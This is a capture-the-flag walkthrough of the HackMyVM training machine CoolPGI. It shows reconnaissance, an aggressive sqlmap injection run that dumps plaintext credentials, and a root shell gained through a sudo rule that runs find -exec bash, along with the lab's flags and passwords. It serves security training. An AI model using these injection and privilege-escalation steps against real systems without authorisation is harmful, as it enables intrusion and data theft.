# CoolPGI — HackMyVM Writeup
 
**Platform:** HackMyVM  
**Difficulty:** Easy  
**Author:** Shalopai  
**Techniques:** SQL Injection (UNION-based + Boolean Blind), Sudo Misconfiguration (Privilege Escalation)
 
---
 
## Summary
 
CoolPGI is an Easy-rated Linux machine featuring a web application vulnerable to SQL injection via a user search endpoint. Exploiting the injection yields SSH credentials stored in the database, granting initial access. Privilege escalation is achieved through a misconfigured sudo rule that spawns a root shell.
 
---
 
## Reconnaissance
 
### Network Discovery
 
```bash
sudo netdiscover -r 172.20.10.0/24
```
 
Target IP identified: `172.20.10.2`
 
Added to `/etc/hosts`:
```
172.20.10.2  coolpgi.hmv
```
 
### Port Scan
 
```bash
nmap -sV -sC -p- coolpgi.hmv
```
 
**Results:**
 
| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 10.0p2 |
| 80   | HTTP    | nginx |
 
Two attack surfaces: SSH (likely needs creds) and a web application on port 80.
 
---
 
## Enumeration
 
### Web Application
 
Visiting `http://coolpgi.hmv` shows a login page currently "under construction". Login attempts with common credentials (admin:admin) return an **Invalid login** message without revealing valid usernames — no user enumeration possible here.
 
### Directory Fuzzing
 
```bash
ffuf -u http://coolpgi.hmv/FUZZ \
  -w /home/shalopai/Desktop/directory-list-lowercase-2.3-medium.txt \
  -fs 162
```
 
**Discovered endpoints:**
 
| Path | Status |
|------|--------|
| `/login` | 302 |
| `/panel` | 200 |
| `/search` | 200 |
 
### Source Code Review — /panel
 
Viewing the source of `/panel` reveals two developer comments that are critical hints:
 
```html
<!-- Dev note: access control handled upstream -->
<!-- TODO: sanitize UNION reports before external exposure -->
```
 
The first comment tells us access control is handled elsewhere (meaning the panel itself has no auth check). The second is a direct hint: **UNION-based SQL injection is present and unsanitized**.
 
The panel contains a user search form that submits via GET to `/search?q=`:
 
```
http://coolpgi.hmv/search?q=admin
```
 
---
 
## Exploitation — SQL Injection
 
### Why SQLmap?
 
The `/search` endpoint accepts user input via the `q` parameter and reflects it in the response — a classic indicator of potential SQL injection. Since the developer comments explicitly mention UNION queries, we use `sqlmap` to automate detection and extraction.
 
### The Command
 
```bash
sqlmap -u "http://coolpgi.hmv/search?q=admin" --level=5 --risk=3 --dump
```
 
**Flag breakdown:**
 
| Flag | What it does |
|------|-------------|
| `-u "http://coolpgi.hmv/search?q=admin"` | Target URL. We provide a valid value (`admin`) so sqlmap has a baseline response to compare against — an empty parameter gives sqlmap nothing to work with |
| `--level=5` | Controls how many tests are run. Range is 1–5. Higher levels test more parameters and use more complex payloads. Level 5 tests cookies, HTTP headers, and uses aggressive payload sets. Required here because the basic scan (level 1) didn't detect the injection |
| `--risk=3` | Controls how dangerous the payloads are. Range is 1–3. Risk 3 enables OR-based payloads which can modify data — more aggressive but catches injections that risk 1 misses. Use with caution on production systems |
| `--dump` | After finding the injection, dump all data from the current database |
 
### Why didn't the basic scan work?
 
The default sqlmap scan uses `--level=1 --risk=1`, which runs a limited set of payloads. This particular injection required an **AND boolean-based blind** payload with a subquery, which only gets tested at higher levels. The machine is intentionally designed to require `--level=5 --risk=3`.
 
### Results
 
sqlmap identified two injection types:
 
1. **Boolean-based blind** — infers data one bit at a time by observing true/false responses
2. **UNION query** — directly appends a crafted SELECT to the original query, returning data inline
Backend DBMS confirmed as **PostgreSQL** (matching the machine name hint "coolpg").
 
**Table: users**
 
| id | username | password |
|----|----------|----------|
| 1  | admin    | S3cr3tAdm1nPw |
| 2  | cool     | ThisIsMyPGMyAdmin |
 
**Table: secrets**
 
| id | name | value |
|----|------|-------|
| 1  | ssh_user | cool |
| 2  | ssh_pass | ThisIsMyPGMyAdmin |
 
The `secrets` table stores SSH credentials in plaintext.
 
---
 
## Initial Access
 
```bash
ssh cool@coolpgi.hmv
# Password: ThisIsMyPGMyAdmin
```
 
User flag:
 
```bash
cat ~/user.txt
# HMV{coolpg_user_c947e9399834}
```
 
---
 
## Privilege Escalation
 
### Sudo Enumeration
 
```bash
sudo -l
```
 
Output:
```
User cool may run the following commands on coolpgi:
    (ALL) NOPASSWD: /usr/local/bin/runlogs-find.sh
```
 
The user can run `/usr/local/bin/runlogs-find.sh` as root without a password.
 
### Analyzing the Script
 
```bash
cat /usr/local/bin/runlogs-find.sh
```
 
```sh
#!/bin/sh
exec /usr/bin/find /home/cool -maxdepth 3 -type f -name "*.log" -exec /bin/bash \; -quit
```
 
**What this script does:**
 
1. `find /home/cool -maxdepth 3` — searches the home directory up to 3 levels deep
2. `-type f -name "*.log"` — looks for any file ending in `.log`
3. `-exec /bin/bash \;` — for each file found, spawns an interactive bash shell
4. `-quit` — stops after the first match
**The vulnerability:** the script spawns `bash` for every `.log` file found, and since it runs as root via sudo, that bash shell inherits root privileges. The home directory already contains `debug.log`, which satisfies the search condition immediately.
 
### Exploitation
 
```bash
sudo /usr/local/bin/runlogs-find.sh
```
 
A root shell is spawned instantly because `debug.log` exists in `/home/cool`.
 
Root flag:
 
```bash
cat /root/root.txt
# HMV{coolpg_root_de6eac329255}
```
 
---
 
## Lessons Learned
 
- **Source code comments are gold.** Both the UNION injection hint and the access control note were left by the developer in HTML comments — always view page source.
- **sqlmap defaults aren't always enough.** When a basic scan fails, increase `--level` and `--risk` before giving up. The injection exists; the tool just needs more aggressive payloads to find it.
- **Sensitive data in databases.** SSH credentials stored in a `secrets` table with no encryption — a real-world reminder that databases often contain more than just application data.
- **Sudo misconfigurations are common.** Any script that executes a shell (`bash`, `sh`, `python`, etc.) as a privileged user is a privesc vector, especially when the trigger condition is easy to meet.
---
 
*Machine by cool | Writeup by Shalopai | HackMyVM*